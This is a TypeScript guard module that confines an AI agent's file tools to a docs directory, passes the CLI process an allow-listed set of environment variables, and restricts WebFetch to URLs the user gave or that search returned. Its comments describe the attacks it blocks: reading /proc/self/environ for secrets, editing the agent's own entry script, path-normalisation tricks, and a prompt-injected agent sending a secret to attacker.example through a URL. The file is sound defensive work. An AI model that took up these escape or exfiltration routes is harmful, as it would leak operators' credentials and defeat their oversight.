// Confines the agent's native file tools to the materialized docs directory
// (ADR 0019 §2.2). Imported by turn-entry.ts as "./docs-path-guard.ts"; the host
// route writes it into the sandbox next to entry.ts. Node only ERASES types from
// this file at load, so keep it free of enums, namespaces and parameter properties.
//
// Why this exists: under `permissionMode: "bypassPermissions"` the SDK's
// Read/Write/Edit/Glob are not confined to `cwd`, and `allowedTools` gates nothing.
// Without a guard `Read /proc/self/environ` returns this process's secrets
// (AGENT_RUN_TOKEN, MCP_TOKEN, ANTHROPIC_API_KEY, MCP_BYPASS_SECRET), and
// `Read /vercel/sandbox/entry.ts` or `Edit` of it would let one turn rewrite the
// code that reports its own result. A PreToolUse hook runs before the permission
// mode is consulted, so a deny here holds regardless of it.

import { lstatSync, realpathSync } from "node:fs"
import path from "node:path"

export type GuardDecision = { allowed: true } | { allowed: false; reason: string }

/** Tool-input fields that carry a filesystem path, whatever the tool is called. */
const PATH_FIELDS = ["file_path", "path", "notebook_path"]
/** Tools that MUST name a file; a missing path is a deny, not a default to cwd. */
const FILE_TOOLS = new Set(["Read", "Write", "Edit", "MultiEdit", "NotebookEdit"])
const GLOB_TOOLS = new Set(["Glob", "Grep"])
/** Tools that only read: the only ones allowed into `readOnlyRoots` (the repo workdir, when the agent has a shell). */
const READ_ONLY_TOOLS = new Set(["Read", "Glob", "Grep"])

/**
 * The real location of `target`, with every symlink on its existing prefix
 * resolved. A path that does not exist yet (Write creating a new file) resolves
 * its deepest existing ancestor and re-appends the rest, so a symlinked directory
 * cannot smuggle a not-yet-created file outside the root.
 *
 * Returns null for a DANGLING symlink (the link exists, its target does not):
 * realpath fails on it exactly as it does for a missing file, so treating it as
 * "not there yet" would let `Write` follow the link and create a file wherever it
 * points, inside the root or not.
 */
function resolveReal(target: string): string | null {
  let current = target
  const tail: string[] = []
  for (;;) {
    try {
      const real = realpathSync(current)
      return tail.length ? path.join(real, ...tail.reverse()) : real
    } catch {
      try {
        lstatSync(current)
        return null // it exists as a link but does not resolve
      } catch {
        /* genuinely absent: climb */
      }
      const parent = path.dirname(current)
      if (parent === current) return target
      tail.push(path.basename(current))
      current = parent
    }
  }
}

function insideRoot(realRoot: string, candidate: string): boolean {
  return candidate === realRoot || candidate.startsWith(realRoot.endsWith(path.sep) ? realRoot : realRoot + path.sep)
}

// C0, DEL and C1 controls. A real doc path never contains one.
// eslint-disable-next-line no-control-regex
const CONTROL_CHARS = /[\u0000-\u001f\u007f-\u009f]/
/** Trees that hold process secrets or devices; denied by name even if some future root would contain them. */
const DENIED_ROOTS = ["/proc", "/sys", "/dev"]

/**
 * Checks that must run on the RAW string, before any normalization. The Claude
 * CLI normalizes a path argument before it opens it (it trims surrounding
 * whitespace and expands `~` and `~/` to the home directory), so a guard that
 * resolves the string as given approves `" /proc/self/environ"` or `"~/.bashrc"`
 * while the tool then reads something else. The rule is therefore not "normalize
 * the same way and compare" (any gap between the two normalizations is a hole)
 * but "refuse every spelling that has a normalization at all": a value that
 * the CLI would leave untouched is the only thing allowed through.
 */
function rawValueProblem(value: string, field: string): string | null {
  if (value !== value.trim()) return `${field} has leading or trailing whitespace`
  if (CONTROL_CHARS.test(value)) return `${field} contains a control character`
  if (value.startsWith("~")) return `${field} starts with ~ (home expansion)`
  if (/[$%]/.test(value)) return `${field} contains $ or % (variable expansion)`
  if (/^["'\u0060]|["'\u0060]$/.test(value)) return `${field} is quoted`
  if (value.includes("://")) return `${field} is a URL`
  return null
}

function checkPath(value: unknown, field: string, realRoot: string, extraRealRoots: string[] = []): string | null {
  if (typeof value !== "string" || value.length === 0) return `${field} must be a non-empty string`
  const raw = rawValueProblem(value, field)
  if (raw) return raw
  // A `..` segment is refused outright, not collapsed. Collapsing it lexically
  // before realpath is wrong whenever an earlier segment is a symlink: for
  // "A/up/../outside/x" with A/up -> .., path.resolve says "A/outside/x" (inside)
  // while the kernel, which resolves `up` first, opens "<root>/../outside/x".
  // No legitimate doc path needs one (titles never produce a dot-dot segment).
  if (value.split(/[\\/]/).includes("..")) return `${field} contains a .. segment`
  // Relative paths are relative to the docs root (the agent's cwd).
  const resolved = path.resolve(realRoot, value)
  if (DENIED_ROOTS.some((root) => resolved === root || resolved.startsWith(root + "/"))) return `${field} is a system path`
  const real = resolveReal(resolved)
  if (real === null) return `${field} is a dangling symlink`
  if (DENIED_ROOTS.some((root) => real === root || real.startsWith(root + "/"))) return `${field} is a system path`
  return insideRoot(realRoot, real) || extraRealRoots.some((root) => insideRoot(root, real)) ? null : `${field} is outside the docs directory`
}

/** Glob/Grep patterns can carry an absolute or parent-relative anchor of their own, including inside braces. */
function checkPattern(value: unknown): string | null {
  if (typeof value !== "string") return "pattern must be a string"
  const raw = rawValueProblem(value, "pattern")
  if (raw) return raw
  if (value.includes("..")) return "pattern may not contain .."
  if (/(^|[{,])\s*[/~]/.test(value) || /^[A-Za-z]:/.test(value)) return "pattern must be relative to the docs directory"
  return null
}

export function checkDocsToolUse(toolName: string, toolInput: unknown, docsRoot: string, opts: { readOnlyRoots?: string[] } = {}): GuardDecision {
  let realRoot: string
  try {
    realRoot = realpathSync(docsRoot)
  } catch {
    return { allowed: false, reason: "docs directory is unavailable" }
  }
  // Extra roots (the cloned-repo workdir) are readable, never writable, by the file tools; an
  // unresolvable one is simply not granted rather than failing the whole check.
  const extraRealRoots: string[] = []
  if (READ_ONLY_TOOLS.has(toolName)) {
    for (const root of opts.readOnlyRoots ?? []) {
      try {
        extraRealRoots.push(realpathSync(root))
      } catch {
        /* not there yet: no access */
      }
    }
  }
  const input = toolInput && typeof toolInput === "object" ? (toolInput as Record<string, unknown>) : {}
  const reasons: string[] = []

  let sawPath = false
  for (const field of PATH_FIELDS) {
    if (!(field in input)) continue
    sawPath = true
    const reason = checkPath(input[field], field, realRoot, extraRealRoots)
    if (reason) reasons.push(reason)
  }
  if (FILE_TOOLS.has(toolName) && !sawPath) reasons.push("a file path is required")
  if (GLOB_TOOLS.has(toolName)) {
    // An omitted `path` means cwd, which is the docs root, so it is fine.
    const reason = checkPattern(input.pattern)
    if (reason) reasons.push(reason)
    if ("glob" in input) {
      const globReason = checkPattern(input.glob)
      if (globReason) reasons.push(globReason)
    }
  }
  if (reasons.length > 0) return { allowed: false, reason: `Blocked: ${reasons[0]}. File tools are limited to the docs directory.` }
  return { allowed: true }
}

/** The PreToolUse hook the Agent SDK calls before every matched tool use. */
export function createDocsPreToolUseHook(docsRoot: string, opts: { readOnlyRoots?: string[] } = {}) {
  return async function docsPreToolUse(input: unknown): Promise<Record<string, unknown>> {
    let decision: GuardDecision
    try {
      const event = (input ?? {}) as { tool_name?: unknown; tool_input?: unknown }
      decision =
        typeof event.tool_name === "string" && event.tool_name.length > 0
          ? checkDocsToolUse(event.tool_name, event.tool_input, docsRoot, opts)
          : { allowed: false, reason: "Blocked: malformed tool call" }
    } catch {
      // An exception must never read as "no objection".
      decision = { allowed: false, reason: "Blocked: the path could not be checked" }
    }
    if (decision.allowed) return { continue: true }
    return {
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "deny",
        permissionDecisionReason: decision.reason,
      },
    }
  }
}

/** Matches every SDK tool that takes a path; the hook is registered for exactly these. */
export const DOCS_GUARDED_TOOLS_MATCHER = "Read|Write|Edit|MultiEdit|NotebookEdit|Glob|Grep"

/** Credentials of the entry script itself: never handed to the model-facing CLI process, whatever else is. */
export const AGENT_PRIVATE_ENV = ["AGENT_RUN_TOKEN", "MCP_TOKEN", "MCP_BYPASS_SECRET"]

/** Passed through to the CLI process only for a turn that has a shell. */
export const GITHUB_ENV_NAMES = ["GH_TOKEN", "GITHUB_TOKEN"]

/** Exact names the CLI process legitimately needs (runtime, locale, TLS, proxies). */
const CLI_ENV_NAMES = new Set([
  "PATH", "HOME", "USER", "LOGNAME", "SHELL", "PWD", "LANG", "LANGUAGE", "TERM", "COLORTERM", "TMPDIR", "TMP", "TEMP", "TZ", "CI",
  "NODE_OPTIONS", "NODE_PATH", "NODE_EXTRA_CA_CERTS", "SSL_CERT_FILE", "SSL_CERT_DIR", "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE",
  "GIT_SSL_CAINFO", "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "no_proxy", "all_proxy",
])
/** Families of names: locale, XDG dirs, Node, and everything the Anthropic SDK / Claude Code read. */
const CLI_ENV_PREFIXES = ["LC_", "XDG_", "NODE_", "ANTHROPIC_", "CLAUDE_", "CLAUDECODE", "DISABLE_"]

/**
 * The environment the model-facing CLI process gets: an ALLOW-list, so a variable
 * added to this process later (a new token, an AGENT_* secret) is not inherited
 * by default. ANTHROPIC_API_KEY is in it because the CLI cannot call the model
 * without it; the file-tool guard, not secrecy, is what protects that one.
 */
export function scrubbedAgentEnv(env: Record<string, string | undefined>, opts: { github?: boolean } = {}): Record<string, string | undefined> {
  const out: Record<string, string | undefined> = {}
  for (const [name, value] of Object.entries(env)) {
    if (value === undefined || AGENT_PRIVATE_ENV.includes(name)) continue
    // The GitHub token rides in the CLI's environment ONLY when the turn has a shell: the Bash
    // hook (github-access.ts) reads it from here and hands it to the jail user, never in command text.
    if (opts.github && GITHUB_ENV_NAMES.includes(name)) {
      out[name] = value
      continue
    }
    if (CLI_ENV_NAMES.has(name) || CLI_ENV_PREFIXES.some((prefix) => name.startsWith(prefix))) out[name] = value
  }
  return out
}

// ── WebFetch ────────────────────────────────────────────────────────────────
//
// With the file tools confined, the remaining way for a prompt-injected agent to
// get data off the box is a URL it chooses: `WebFetch https://attacker.example/?d=<secret>`
// (the path works just as well as the query). A host allowlist cannot express
// "whatever the user asked about", and a no-query rule still leaks through the
// path. So WebFetch is limited to URLs that were not invented by the model:
//
//   - URLs that appear in the conversation text the user (or the replayed
//     history) supplied, and
//   - URLs returned by the Compass-hosted web_search tool in this very turn.
//
// Matching is exact on the normalized URL, so an allowed URL cannot be extended
// with appended data. This keeps "read the page I named" and "follow a search
// result", and drops "fetch a URL the model made up".

const URL_PATTERN = /https?:\/\/[^\s<>"'\u0060)\]}\\]+/gi
const MAX_ALLOWED_URLS = 500

/** The canonical form used to compare URLs, or null for anything WebFetch should never see. */
export function normalizeFetchUrl(value: unknown): string | null {
  if (typeof value !== "string") return null
  if (value !== value.trim() || CONTROL_CHARS.test(value)) return null
  let url: URL
  try {
    url = new URL(value)
  } catch {
    return null
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") return null
  if (url.username || url.password) return null
  url.hash = ""
  return url.href
}

/** URLs mentioned in free text, trailing sentence punctuation removed. */
export function extractUrls(text: string): string[] {
  const out: string[] = []
  for (const match of text.matchAll(URL_PATTERN)) {
    const cleaned = match[0].replace(/[.,;:!?]+$/, "")
    const normalized = normalizeFetchUrl(cleaned)
    if (normalized) out.push(normalized)
  }
  return out
}

export function createAllowedUrls(seedText: string): Set<string> {
  return new Set(extractUrls(seedText).slice(0, MAX_ALLOWED_URLS))
}

export function checkWebFetch(toolInput: unknown, allowed: ReadonlySet<string>): GuardDecision {
  const url = toolInput && typeof toolInput === "object" ? (toolInput as Record<string, unknown>).url : undefined
  const normalized = normalizeFetchUrl(url)
  if (!normalized) return { allowed: false, reason: "Blocked: WebFetch needs a plain http(s) URL." }
  if (!allowed.has(normalized)) {
    return {
      allowed: false,
      reason: "Blocked: WebFetch only opens URLs the user gave you or that web_search returned in this conversation. Use web_search to find the page.",
    }
  }
  return { allowed: true }
}

/** PreToolUse hook for WebFetch. */
export function createWebFetchPreToolUseHook(allowed: ReadonlySet<string>) {
  return async function webFetchPreToolUse(input: unknown): Promise<Record<string, unknown>> {
    let decision: GuardDecision
    try {
      decision = checkWebFetch(((input ?? {}) as { tool_input?: unknown }).tool_input, allowed)
    } catch {
      decision = { allowed: false, reason: "Blocked: the URL could not be checked" }
    }
    if (decision.allowed) return { continue: true }
    return { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: decision.reason } }
  }
}

/** PostToolUse hook for the web_search tool: its results become fetchable. */
export function createSearchResultCollector(allowed: Set<string>) {
  return async function collectSearchUrls(input: unknown): Promise<Record<string, unknown>> {
    try {
      const event = (input ?? {}) as { tool_response?: unknown }
      const text = typeof event.tool_response === "string" ? event.tool_response : JSON.stringify(event.tool_response ?? "")
      for (const url of extractUrls(text)) {
        if (allowed.size >= MAX_ALLOWED_URLS) break
        allowed.add(url)
      }
    } catch {
      /* a result we cannot read just stays unfetchable */
    }
    return { continue: true }
  }
}

export const WEB_FETCH_MATCHER = "WebFetch"
// The Compass-hosted search server is registered as `web_search` and exposes one tool,
// `web_search`, so the model-facing name is `mcp__web_search__web_search`. A hook matcher made
// only of [A-Za-z0-9_|] is an EXACT tool name, so the bare server prefix never matched anything;
// the `.*` makes it a regex that covers every tool on that server.
export const WEB_SEARCH_MATCHER = "mcp__web_search__.*"
